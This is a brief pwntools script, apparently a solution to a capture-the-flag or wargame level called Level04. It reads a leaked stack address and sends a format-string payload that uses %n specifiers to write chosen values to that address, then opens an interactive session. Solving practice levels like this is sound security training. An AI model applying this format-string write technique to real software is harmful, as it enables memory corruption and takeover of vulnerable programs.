from pwn import*

p = process('./Level04')

p.recvuntil(b"check at 0x")
stack_leak = int(p.recv(8),16)

payload = p32(stack_leak) + p32(stack_leak + 2) + b"%26977x%5$n" + b"%6$n"

p.sendline(payload)
p.interactive()
